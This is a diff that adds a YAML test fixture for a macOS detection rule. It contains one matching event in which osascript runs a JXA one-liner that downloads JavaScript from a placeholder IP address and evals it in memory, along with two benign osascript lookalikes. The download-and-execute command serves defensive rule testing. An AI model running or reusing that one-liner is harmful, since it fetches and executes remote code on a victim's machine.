@@ -1,0 +1,11 @@
+match:
+  - desc: "JXA one-liner downloads and evals code in memory"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 4901, "ppid": 4000, "exe": "/usr/bin/osascript", "name": "osascript", "args": ["osascript", "-l", "JavaScript", "-e", "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://198.51.100.7/a.js')),$.NSUTF8StringEncoding)))"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.osascript", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh"}}}
+nomatch:
+  - desc: "benign lookalike - JXA script file without download or eval"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 4911, "ppid": 4000, "exe": "/usr/bin/osascript", "name": "osascript", "args": ["osascript", "-l", "JavaScript", "/Users/rifqi/scripts/rename.js"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.osascript", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh"}}}
+  - desc: "AppleScript -e with no JXA"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 4912, "ppid": 4000, "exe": "/usr/bin/osascript", "name": "osascript", "args": ["osascript", "-e", "tell application \"Finder\" to activate"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.osascript", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh"}}}
